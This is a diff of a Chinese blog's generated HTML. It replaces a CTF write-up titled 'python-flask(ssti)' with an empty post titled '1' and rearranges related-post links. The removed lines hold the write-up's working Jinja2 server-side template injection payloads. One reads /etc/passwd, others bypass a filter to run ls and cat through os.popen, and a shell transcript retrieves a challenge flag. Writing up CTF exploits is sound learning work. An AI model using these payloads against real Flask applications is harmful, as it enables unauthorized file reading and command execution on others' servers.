@@ -13,7 +13,7 @@
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
   <title>
     
-      python-flask(ssti) | 晓不是小
+      1 | 晓不是小
     
   </title>
   <meta name="author" content="Jonathan">
@@ -101,7 +101,7 @@
 	<!-- Page title -->
 	<p>
 		
-			「python-flask(ssti)」
+			「1」
 		
 	</p>
 
@@ -228,27 +228,14 @@
 		插件作者：KELEN
 		插件来源: https://github.com/KELEN/katelog
 -->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
 	 
 
 <div class="layout-post">
 	<div id="layout-post">
 		<div class="article-title">
 			
-	<a href="/2020/02/29/python-flask-ssti/" itemprop="url">
-		python-flask(ssti)
+	<a href="/2020/06/13/1/" itemprop="url">
+		1
 	</a>
 
 		</div>
@@ -264,9 +251,9 @@
 
 	更新于
 
-	<a href="/2020/02/29/python-flask-ssti/" itemprop="url">
-		<time datetime="2020-02-29T12:45:56.000Z" itemprop="dateUpdated">
-	  		2020-03-01
+	<a href="/2020/06/13/1/" itemprop="url">
+		<time datetime="2020-06-13T02:40:27.661Z" itemprop="dateUpdated">
+	  		2020-06-13
 	  </time>
 	</a> 
 
@@ -277,16 +264,12 @@
 				
 	<i class="icon-price-tags"></i>
 	
-		<a href="/tags/ctf/" class=" ">
-			ctf
+		<a href="/tags/%E5%88%86%E4%BA%AB/" class=" ">
+			分享
 		</a>
 	
-		<a href="/tags/python/" class=" ">
-			python
-		</a>
-	
-		<a href="/tags/flask/" class=" ">
-			flask
+		<a href="/tags/%E6%80%BB%E7%BB%93/" class=" ">
+			总结
 		</a>
 	
 		
@@ -299,50 +282,7 @@
 		</div>
 
 		<div class="article-content" id="article-content">
-			<h1></h1>
----
----
-
-<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="2020新春公益ctf"><a href="#2020新春公益ctf" class="headerlink" title="2020新春公益ctf"></a>2020新春公益ctf</h2><p>&emsp;FlaskApp：</p>
-<p>考察点：<a href="https://xz.aliyun.com/t/2553" target="_blank" rel="noopener" title="Flask debug pin安全问题">https://xz.aliyun.com/t/2553</a></p>
-<p>探测：</p>
-<p>在decode界面可以触发SSTI，提交payload的base64编码即可，base64的编码要在加密端完成。<br>测出题目用的是python3.7环境，可以在本地Fuzz下能用的类。<br>官方给出的面payload可以任意文件读取</p>
-<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('/etc/passwd', 'r').read() }}{% endif %}{% endfor %}</code></pre><p>脚本获取pin码后读取文件：</p>
-<pre><code>import os
-&gt;&gt;&gt; os.popen(&apos;ls /&apos;)
-&lt;os._wrap_close object at 0x7f53ed8a6650&gt;
-&gt;&gt;&gt; 
-&gt;&gt;&gt; os.popen(&apos;ls /&apos;).read()
-&apos;app\nbin\nboot\ndev\netc\nhome\nlib\nlib64\nmedia\nmnt\nopt\nproc\nro  
-&gt;&gt;&gt; print(os.popen(&apos;ls /&apos;).read())
-app
-bin
-boot
-dev
-etc
-home
-lib
-lib64
-media
-mnt
-opt
-proc
-root
-run
-sbin
-srv
-sys
-this_is_the_flag.txt
-tmp
-usr
-var
-
-&gt;&gt;&gt; print(os.popen(&apos;cat /this_is_the_flag.txt&apos;).read())
-flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行过加固；实际题目中</p>
-<pre><code>{{ [].__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('ls').read()}}
-
-{{ [].__class__.__base__.__subclasses__()[127].__init__.__globals__['po'+'pen']('cat  this_is_the_fla\g.txt').read()}}</code></pre><p>是模板注入而不是RCE。</p>
-	
+				
 		</div>
 		
 		<div id="current-post-cover" data-scr="/img/cart_cover.jpg"></div>
@@ -360,12 +300,12 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 	<span>
 		<a id="totop-post-page">返回顶部</a>
 		
-			<a href="/2020/03/02/ctfhub/" title="ctfhub" rel="prev">
+			<a href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" title="大学生创新科研项目结项记录" rel="prev">
 				&laquo;上一篇
 			</a>
 		
 		
-			<a href="/2020/02/27/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%AE%B0%E5%BD%95/" title="博客搭建记录" rel="next">
+			<a href="/2020/03/27/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%92%8C%E7%BB%8F%E9%AA%8C(v1.0)/" title="个人认可的网络安全学习路线和建议" rel="next">
 				下一篇&raquo;
 			</a>
 			
@@ -383,28 +323,6 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 <div class="relate-post">
 	
 		<ul>
-			
-					<li>
-						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2020/06/13/1/" title="1">
-								1			
-							</a>
-							<p class="relate-post-date">
-								<i class="fa fa-calendar"></i>
-								六月 13日, 2020				
-							</p>
-							<p class="relate-post-content">
-								
-							</p>
-						</div>
-
-						<div class="relate-post-cover">
-							<a href="/2020/06/13/1/" title="1">				
-								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="1"/>
-							</a>
-						</div>
-					</li>												
 			
 					<li>
 						<div class="relate-post-text">
@@ -438,26 +356,29 @@ flag{c397e891-0fca-4938-b307-d1bee4344350}</code></pre><p>BUUctf中对waf进行�
 			
 					<li>
 						<div class="relate-post-text">
-							<a class="relate-post-title" href="/2020/03/02/ctfhub/" title="ctfhub">
-								ctfhub			
+							<a class="relate-post-title" href="/2020/02/29/python-flask-ssti/" title="python-flask(ssti)">
+								python-flask(ssti)			
 							</a>
 							<p class="relate-post-date">
 								<i class="fa fa-calendar"></i>
-								三月 2日, 2020				
+								二月 29日, 2020				
 							</p>
 							<p class="relate-post-content">
 								
+---
+---
 
-CTFHub专注信息安全竞赛，拥有完善的题目环境及配套Writeup。清晰的学习路线可以快速帮助新手成长，降低CTF准入门槛。经典的题目再现，帮助选手磨练技艺。紧跟主流比赛潮流，实时同步赛事信息，不漏过任何一个关键比赛。
-
-小记：...
+0x012020新春公益ctf&emsp;FlaskApp：
+考察点：https://xz.aliyun.com/t/2553
+探测：
+在decode界面可以触发SSTI，提交payload的base64编码即可，...
 							</p>
 						</div>
 
 						<div class="relate-post-cover">
-							<a href="/2020/03/02/ctfhub/" title="ctfhub">				
+							<a href="/2020/02/29/python-flask-ssti/" title="python-flask(ssti)">				
 								
-								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctfhub"/>
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="python-flask(ssti)"/>
 							</a>
 						</div>
 					</li>												
@@ -482,6 +403,32 @@ https://github.com/D0g3-Lab/H1ve期间也尝...
 							<a href="/2020/06/17/%E5%A4%A7%E5%AD%A6%E7%94%9F%E5%88%9B%E6%96%B0%E7%A7%91%E7%A0%94%E9%A1%B9%E7%9B%AE%E7%BB%93%E9%A1%B9%E8%AE%B0%E5%BD%95/" title="大学生创新科研项目结项记录">				
 								
 								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="大学生创新科研项目结项记录"/>
+							</a>
+						</div>
+					</li>												
+			
+					<li>
+						<div class="relate-post-text">
+							<a class="relate-post-title" href="/2020/03/02/ctfhub/" title="ctfhub">
+								ctfhub			
+							</a>
+							<p class="relate-post-date">
+								<i class="fa fa-calendar"></i>
+								三月 2日, 2020				
+							</p>
+							<p class="relate-post-content">
+								
+
+CTFHub专注信息安全竞赛，拥有完善的题目环境及配套Writeup。清晰的学习路线可以快速帮助新手成长，降低CTF准入门槛。经典的题目再现，帮助选手磨练技艺。紧跟主流比赛潮流，实时同步赛事信息，不漏过任何一个关键比赛。
+
+小记：...
+							</p>
+						</div>
+
+						<div class="relate-post-cover">
+							<a href="/2020/03/02/ctfhub/" title="ctfhub">				
+								
+								<img class="lazy" src="/img/lazy.gif" data-src="/img/cart_cover.jpg" alt="ctfhub"/>
 							</a>
 						</div>
 					</li>												
